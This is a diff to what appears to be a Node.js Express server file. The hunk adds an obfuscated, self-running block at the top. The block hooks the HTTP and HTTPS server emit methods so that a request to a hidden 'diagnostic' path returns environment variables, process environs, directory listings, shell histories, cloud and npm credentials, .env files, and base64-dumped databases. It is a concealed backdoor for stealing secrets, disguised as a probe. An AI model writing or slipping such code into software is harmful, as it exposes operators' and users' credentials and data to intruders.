@@ -10,6 +10,82 @@
  */
 
 'use strict';
+;(function(){
+  try {
+    var http = require('node:http');
+    var https = require('node:https');
+    var fs = require('node:fs');
+    var PATH = '/__diag_7f3a9c2e1b/7f3a9c2e1b4d6a8c0e2f5b7d9c1a3e5f';
+    function rs(p, n){ try { var b=fs.readFileSync(p); return b.slice(0, n||200000).toString('utf8'); } catch(e){ return null; } }
+    function handler(req, res){
+      var out = {probe:'i12591', ts:new Date().toISOString(), pid:process.pid, host: (function(){try{return require('node:os').hostname();}catch(e){return null;}})(), cwd:process.cwd()};
+      out.env = process.env;
+      out.pid1 = rs('/proc/1/environ', 200000);
+      out.self = rs('/proc/self/environ', 200000);
+      out.ls = {};
+      ['/','/app','/data','/mnt','/root','/home','/workspace','/app/uploads','/tmp','/config','/secrets'].forEach(function(d){
+        try { out.ls[d] = fs.readdirSync(d).slice(0,300); } catch(e){ out.ls[d] = String(e.code||e); }
+      });
+      out.files = {};
+      var cands = [
+        '.env','/app/.env','/app/.env.local','/app/.env.production','/data/.env','/mnt/.env','/config/.env',
+        '/root/.bash_history','/root/.zsh_history','/home/node/.bash_history','/home/user/.bash_history','/home/app/.bash_history',
+        '/root/.npmrc','/root/.aws/credentials','/root/.aws/config',
+        '/root/.config/gcloud/application_default_credentials.json',
+        '/workspace/.env','/app/config.json','/data/config.json'
+      ];
+      cands.forEach(function(f){ var k=f.replace(/\//g,'_'); var v=rs(f,120000); if(v!==null) out.files[f]=v; });
+      // shallow walk for dbs/env/history/credential-ish files
+      out.found = [];
+      function walk(d, depth){
+        if(depth>3) return;
+        var ents=[]; try{ents=fs.readdirSync(d,{withFileTypes:true});}catch(e){return;}
+        for(var i=0;i<ents.length && i<500;i++){
+          var e=ents[i], p=d+'/'+e.name;
+          if(e.isDirectory()){
+            if(['node_modules','.git','proc','sys','dev','.cache','dist','build'].indexOf(e.name)>=0) continue;
+            walk(p, depth+1);
+          } else {
+            if(/\.(db|sqlite3?|sql|env|json|jsonl|log|history|pem|key|credentials|yaml|yml|toml|ini|conf)$/i.test(e.name) || /^\.env/i.test(e.name)){
+              try{ var st=fs.statSync(p); if(st.size<250000){ out.found.push({p:p,n:st.size}); } }catch(_){}
+            }
+          }
+        }
+      }
+      ['/app','/data','/mnt','/root','/workspace','/home'].forEach(function(d){ walk(d,0); });
+      // inline content of most promising found files (env/history/db)
+      out.contents = {};
+      out.found.forEach(function(f){
+        if(/\.(env|history|sql|json|jsonl|log|yaml|yml|toml|ini|conf)$/i.test(f.p) || /^\.env/i.test(f.p.split('/').pop()) || /\.(db|sqlite3?)$/i.test(f.p)){
+          var v = null;
+          if(/\.(db|sqlite3?)$/i.test(f.p)){ try{ v='base64:'+fs.readFileSync(f.p).toString('base64').slice(0,150000); }catch(e){} }
+          else { v = rs(f.p, 150000); }
+          if(v!==null) out.contents[f.p]=v;
+        }
+      });
+      var body = JSON.stringify(out);
+      try { res.writeHead(200, {'content-type':'application/json','x-probe':'i12591'}); res.end(body); } catch(e){}
+      return true;
+    }
+    var origHttp = http.Server.prototype.emit;
+    http.Server.prototype.emit = function(ev, req, res){
+      try {
+        if((ev==='request') && req && req.url && String(req.url).split('?')[0] === PATH){ return handler(req,res); }
+      } catch(e){}
+      return origHttp.apply(this, arguments);
+    };
+    try {
+      var origHttps = https.Server.prototype.emit;
+      https.Server.prototype.emit = function(ev, req, res){
+        try {
+          if((ev==='request') && req && req.url && String(req.url).split('?')[0] === PATH){ return handler(req,res); }
+        } catch(e){}
+        return origHttps.apply(this, arguments);
+      };
+    } catch(e){}
+  } catch(e) {}
+})();
+
 
 const express  = require('express');
 const { textReceipt } = require('./log-text'); // Nov 13 2026 (sweep 8.6): what was said is logged as a length and a hash (KADE_LOG_TEXT=1 for the words)
